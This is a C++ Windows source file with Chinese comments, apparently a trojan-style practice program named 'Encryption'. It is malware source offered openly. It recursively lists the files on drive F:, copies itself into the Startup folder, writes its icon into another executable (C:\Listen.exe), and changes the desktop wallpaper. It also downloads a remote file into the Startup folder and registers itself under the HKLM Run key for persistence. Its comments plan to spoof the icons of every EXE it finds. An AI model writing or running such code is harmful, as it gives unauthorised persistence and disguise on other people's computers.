// Encryption.cpp : 定义控制台应用程序的入口点。
//

/*
struct _finddata_t
{
unsigned attrib;     //文件属性
time_t time_create;  //文件创建时间
time_t time_access;  //文件上一次访问时间
time_t time_write;   //文件上一次修改时间
_fsize_t size;  //文件字节数
char name[_MAX_FNAME]; //文件名
};
*/


//深度优先递归遍历当前目录下文件夹和文件及子文件夹和文件
#include "stdafx.h"
#include<windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include<io.h>
#include<Libloaderapi.h>
#include<shlobj.h>
#pragma comment(lib,"urlmon.lib")//这是一个预编译指令,下载用的

using namespace std;
void getAllFiles(string path, vector<string>& files)
{
	//文件句柄 
	long  hFile = 0;
	//文件信息 
	struct _finddata_t fileinfo; //很少用的文件信息读取结构
	string p; //string类很有意思的一个赋值函数:assign()，有很多重载版本
	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
	{
		do
		{
			if ((fileinfo.attrib & _A_SUBDIR)) //判断是否为文件夹
			{
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
				{
					files.push_back(p.assign(path).append("/").append(fileinfo.name));//保存文件夹名字
					getAllFiles(p.assign(path).append("/").append(fileinfo.name), files);//递归当前文件夹
				}
			}
			else  //文件处理
			{
				files.push_back(p.assign(path).append("/").append(fileinfo.name));//文件名
			}
		} while (_findnext(hFile, &fileinfo) == 0); //寻找下一个，成功返回0，否则-1
		_findclose(hFile);
	}
}

BOOL ChangeIcon(LPCTSTR pszChangeIconExeFileName)
{
	
	//获取自身的句柄
	HANDLE hLocalHost = GetCurrentProcess();
	if (NULL == hLocalHost)
	{
		cout << "1:"<<GetLastError() << endl;
	}
	HMODULE hLocalHostModule = GetModuleHandleA(NULL);
	if (NULL == hLocalHostModule)
	{
		cout << "2:" << GetLastError() << endl;
	}
	//把伪句柄转换成正句柄
	DuplicateHandle(
		GetCurrentProcess(),   //源进程内核句柄（即负责传递内核对象句柄的进程句柄)
		hLocalHost,   //进程伪句柄 GetCurrentProcess()
		GetCurrentProcess(),   //目标进程内核句柄
		&hLocalHost,    //接受新的，真实句柄！
		0,                     //TargetHandle句柄使用何种访问掩码，这个参数将被忽略，因为DUPLICATE_SAME_ACCESS
		FALSE,                 //新的句柄不可继承
		DUPLICATE_SAME_ACCESS);//新句柄拥有与原始句柄相同的安全访问特征
	////////////////////////////////////////////////////////////////////////////////////////
	//1.如果为空表示获取当前进程模块
	//2.资源名称
	//3.资源类型
	//TOP：资源参考docs.microsoft.com/en-us/windows/desktop/menurc/resource-types
	////////////////////////////////////////////////////////////////////////////////////////
	//找到资源程序图标
	HRSRC hRsrc = FindResource(hLocalHostModule, (LPCTSTR)1, RT_ICON);
	if (NULL == hRsrc)
	{
		cout << "3:" << GetLastError() << endl;
	}
	DWORD dwSize = SizeofResource(hLocalHostModule,hRsrc);
	if (dwSize<=0)
	{
		cout << "4:" << GetLastError() << endl;
	}
	// 加载资源到程序内存
	HGLOBAL hGlobal = LoadResource(hLocalHostModule, hRsrc);
	if (NULL == hGlobal)
	{
		cout << "5:" << GetLastError() << endl;
	}
	// 锁定资源内存
	LPVOID lpVoid = LockResource(hGlobal);
	if (NULL == lpVoid)
	{
		cout << "6:" << GetLastError() << endl;
	}
	//获取可以被UPDATERESOURCE修改的句柄
	HANDLE hUpdate = BeginUpdateResource(pszChangeIconExeFileName, FALSE);
	if (NULL == hUpdate)
	{
		cout << "7:" << GetLastError() << endl;
	}
	//更新
	//1.句柄 2.资源类型 3.资源ID 4.语言标识 5.指向资源地址 6.资源大小
	BOOL bRet =UpdateResource(hUpdate, RT_ICON, (LPCTSTR)1, LANG_NEUTRAL, lpVoid, dwSize);
	if (0 == bRet)
	{
		cout << "8:" << GetLastError() << endl;
	}
	EndUpdateResource(hUpdate, FALSE);
	return 0;
}

void CopyMyself()
{
	
	TCHAR tcBuff[MAX_PATH];//缓冲区
    //复制到的地址
	TCHAR tcTarget[120] = _T("C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\EncryptionRun.exe");
	GetModuleFileName(NULL, tcBuff, sizeof(tcBuff));//获取自己的名字
	//copy有问题明天解决tcBuff转成吃字符串
	//第一个参数是自己名字第二个是是复制后的名字
	CopyFile(tcBuff, tcTarget, FALSE);
	//cout << &tcBuff << endl;
	
}

 
BOOL FreeMyResourceImg(char * ipszFileName)
{
	LPCWSTR b = _T("IMG");
	//获取自身的句柄
	HMODULE hLocalHostModule = GetModuleHandleA(NULL);
	if (NULL == hLocalHostModule)
	{
		cout << "2:" << GetLastError() << endl;
	}

	HRSRC hRsrc = FindResource(hLocalHostModule, (LPCTSTR)120, b);
	if (NULL == hRsrc)
	{
		cout << "3:" << GetLastError() << endl;
	}
	DWORD dwSize = SizeofResource(hLocalHostModule, hRsrc);
	if (dwSize <= 0)
	{
		cout << "4:" << GetLastError() << endl;
	}
	// 加载资源到程序内存
	HGLOBAL hGlobal = LoadResource(hLocalHostModule, hRsrc);
	if (NULL == hGlobal)
	{
		cout << "5:" << GetLastError() << endl;
	}
	// 锁定资源内存
	LPVOID lpVoid = LockResource(hGlobal);
	if (NULL == lpVoid)
	{
		cout << "6:" << GetLastError() << endl;
	}
	//保存锁定在内存中的资源
	FILE * fileImgSave = NULL;
	fopen_s(&fileImgSave, ipszFileName, "wb+");
	fwrite(lpVoid, sizeof(char), dwSize, fileImgSave);
	fclose(fileImgSave);
	 

	return TRUE;

}
//修改注册列表函数
BOOL SetRegKeyAutoRun(wchar_t *szKeyName, wchar_t *szPath, const int nPathLen)
{
	bool bRet = false;
	HKEY hKey = { 0 };
	do {

		wchar_t *szKeyPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		//如果想要修改注册表需要调用系统API  这是个一打开注册表的函数         这是32位注册列表    这是64位的
		if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, szKeyPath, NULL, KEY_WRITE | KEY_WOW64_64KEY, &hKey))
		{
			break;
		}
		if (ERROR_SUCCESS != RegSetValueEx(hKey, szKeyName, 0, REG_SZ, (byte*)szPath, nPathLen))
		{
			break;
		}
		bRet = true;

	} while (false);
	if (hKey) 
	{

		RegCloseKey(hKey);
	}
	return bRet;

}
//测试 
int main()
{
	//获取文件名并存到TXT中的代码段
	string DATA_DIR = "F:";
	vector<string> files;
	//测试
	char * DistAll = "AllFiles.txt";
	getAllFiles(DATA_DIR, files);//所有文件与文件夹的路径都输出
	ofstream ofn(DistAll); //输出文件流
	int size = files.size();
	int FaiNum = 0;
	ofn << size << endl;
	for (int i = 0; i<size; i++)
	{
		ofn << files[i] << endl;
	}
	ofn.close();
	//复制自身的代码段
    CopyMyself();
	//修改图标(目前只修改了一个文件，后期遍历文件后找出EXE文件然后修改图标)
	LPCTSTR lpcName = _T("C:\\Listen.exe");
	ChangeIcon(lpcName);
	//提取reeMy自身的自身资源
	char ipszFileName[9] = ("C:\\1.bmp");
	FreeMyResourceImg(ipszFileName);
	//修改桌面壁纸
	//TMD这屌问题搞了一天做个总结！！！！！！！！！！
	//1.SystemParametersInfo只能用bmp格式
	//2.必须要用宽字符也就是UTF的编码
	PVOID pImg = L"C:\\1.bmp";
	BOOL SPI = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0,
		pImg,
		SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	if (SPI <= 0)
	{
		cout << "问题:" << GetLastError() << endl;
	}
	//下载文件并放到开机启动项
	wchar_t szUrl[MAXBYTE] = L"https://gss2.bdstatic.com/9fo3dSag_xI4khGkpoWK1HF6hhy/baike/s%3D220/sign=f28cef68ac18972ba73a07c8d6cc7b9d/8718367adab44aed0ce96d98b41c8701a18bfb23.jpg";
	wchar_t szPath[MAX_PATH] = L"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\love.jpg";
	URLDownloadToFile(nullptr, szUrl, szPath, 0, nullptr);//下载函数
	wchar_t szFilePath[MAX_PATH] = { 0 };//文件的路径
										 //获取文件的路径
										 //使用nullptr会默认取本文件
	GetModuleFileName(nullptr, szFilePath, MAX_PATH);
	//修改注册列表让本程序为开机启动
	SetRegKeyAutoRun(L"Ascotbe", szFilePath, (wcslen(szFilePath) + 1) * 2);

	getchar();
	return 0;
}
